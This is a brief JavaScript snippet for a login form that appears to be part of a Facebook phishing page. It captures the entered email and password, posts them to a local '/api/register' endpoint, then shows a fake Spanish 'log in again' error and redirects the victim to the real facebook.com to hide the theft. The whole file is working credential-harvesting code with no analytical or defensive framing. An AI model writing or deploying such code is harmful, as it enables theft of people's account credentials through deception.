document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    await fetch('/api/register', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ email, password })
    });

    setTimeout(() => {
        alert('Error inicia sesion de nuevo');
        window.location.href = 'https://www.facebook.com/';
    }, 1000);
});
